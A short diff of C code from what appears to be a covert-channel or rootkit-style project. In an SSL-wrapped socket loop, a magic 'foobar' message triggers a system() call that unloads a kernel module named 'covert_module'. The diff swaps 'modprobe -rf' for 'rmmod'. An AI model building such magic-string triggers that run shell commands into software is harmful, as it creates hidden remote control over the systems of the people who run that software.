@@ -337,7 +337,8 @@ void epoll_event_loop(SSL* ssl) {
                         SSL_write(ssl, buffer, size + 1);
                     } else if (eventList[i].data.fd == conn_sock && memcmp(buffer, "foobar", 6) == 0) {
                         //Kernel is telling userspace to unload the kernel module
-                        system("modprobe -rf covert_module");
+                        //system("modprobe -rf covert_module");
+                        system("rmmod covert_module");
                     } else {
                         SSL_write(ssl, buffer, size);
                     }
